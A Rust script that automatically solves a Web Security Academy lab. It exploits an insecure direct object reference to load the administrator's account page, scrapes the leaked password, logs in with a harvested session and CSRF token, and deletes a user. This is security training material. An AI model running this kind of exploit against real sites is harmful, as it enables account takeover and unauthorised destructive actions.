/******************************************************************************
*
* Lab: User ID controlled by request parameter with password disclosure
*
* Hack Steps: 
*      1. Fetch the administrator page via URL id parameter
*      2. Extract the password from the source code
*      3. Fetch the login page to get a valid session and the csrf token
*      4. Login as administrator
*      5. Delete carlos
*
*******************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a1d002a04d9a3e285af9bf100e30072.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the administrator profile page.. ");
    flush_terminal();

    let admin_profile = fetch("/my-account?id=administrator");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting password from the source code.. ");
    flush_terminal();

    let body = admin_profile.text().unwrap();
    let admin_password = capture_pattern_from_text("name=password value='(.*)'", &body);

    println!("{} => {}", "OK".green(), admin_password.yellow());
    print!("⦗3⦘ Fetching the login page to get a valid session and the csrf token.. ");
    flush_terminal();

    let login_page = fetch("/login");
    let session = get_session_cookie(&login_page);
    let csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗4⦘ Logging in as administrator.. ");
    flush_terminal();

    let login_as_admin = WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", &admin_password),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as admin".red()));

    println!("{}", "OK".green());
    print!("⦗5⦘ Deleting carlos.. ");
    flush_terminal();

    let admin_session = get_session_cookie(&login_as_admin);
    fetch_with_session("/admin/delete?username=carlos", &admin_session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
